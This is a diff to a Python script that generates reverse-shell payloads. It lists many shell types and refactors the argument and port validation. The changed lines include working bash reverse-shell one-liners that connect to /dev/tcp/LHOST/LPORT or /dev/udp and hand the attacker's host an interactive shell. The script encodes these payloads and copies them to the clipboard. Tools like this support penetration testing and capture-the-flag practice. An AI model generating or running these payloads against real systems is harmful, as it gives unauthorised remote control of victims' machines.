@@ -2,21 +2,14 @@
 
 import argparse
 from base64 import b64encode
-from importlib.util import find_spec
 from urllib.parse import quote
 from psutil import net_if_addrs
 from sys import argv
 from pyperclip import copy
 from re import match
 
-requirements = ("pyperclip","psutil")
-
-for library in requirements:
-    if not find_spec(library):
-        print(f"[!] Looks like you don't have {library} installed.\npip3 install {library}")
-        exit(0)
-
 available_shells = '| BASH | SH | NC | NCAT | RUSTCAT | PERL | PHP | WINDOWS | POWERSHELL | PYTHON | RUBY | SOCAT | NODEJS | TELNET | ZSH | LUA | GOLANG | AWK |'
+subgroup = None
 
 def usage():
     global available_shells
@@ -83,12 +76,12 @@ def craftingTable(shell):
             results(user_shell)
             return
         idk+=1
-
+# Store every reverse shell syntax
 shells = {
     'bash':{
-        'gurgui':''' bash -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
+        'basic':''' bash -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
         '196':''' 0<&196;exec 196<>/dev/tcp/LHOST/LPORT; bash <&196 >&196 2>&196 ''',
-        'read line':''' exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done ''',
+        'readline':''' exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done ''',
         '5':''' bash -i 5<> /dev/tcp/LHOST/LPORT 0<&5 1>&5 2>&5 ''',
         'udp':''' bash -i >& /dev/udp/LHOST/LPORT 0>&1 '''
     },
@@ -196,7 +189,29 @@ if args.listall:
 # Shell must be given
 if not args.shell:
     print("[!] Shell type must be given")
-    exit(0) 
+    exit(0)
+
+# Make shell lowercase to avoid case problems
+shell = args.shell.lower()
+
+# Makes netcat nc so user don't have to remember if it was nc or netcat
+if "netcat" in shell:
+    shell = shell.replace("netcat","nc")
+
+# Split shell type and name
+if "=" in shell:
+    subgroup = shell.split("=")[1]
+    shell = shell.split("=")[0]
+    try:
+        shells[shell][subgroup]
+    except:
+        print(f"[-]Name {subgroup} not found in {shell} shells")
+        exit(0)
+
+# Shell must be available
+if shell.upper() not in available_shells:
+    print(f"[!] {args.shell} not in available shells")
+    exit(0)
 
 # Lhost must be given
 if not args.lhost:
@@ -212,30 +227,11 @@ except:
         exit(0)
     lhost = args.lhost
 
-# Make shell lowercase to avoid case problems
-shell = args.shell.lower()
-
-# Makes netcat nc so user don't have to remember if it was nc or netcat
-if "netcat" in shell:
-    shell = shell.replace("netcat","nc")
-
-subgroup = None
-
-# Split shell type and name
-if "=" in shell:
-    subgroup = shell.split("=")[1]
-    shell = shell.split("=")[0]
-
-# Check if shell is in available shells
-if shell.upper() not in available_shells:
-    print(f"[!] There isn't a shell called {shell}\nAvailable shells: {available_shells}")
-    exit(0)
-
-# Check if specific shell name exists
+# Make sure lport is a number at least
 try:
-    shells[shell][subgroup]
+    int(args.lport)
 except:
-    print(f"[-]Name {subgroup} not found in {shell} shells")
+    print(f"{args.lport} is not a valid port number")
     exit(0)
 
 # Make lport user choice or 4444 by default
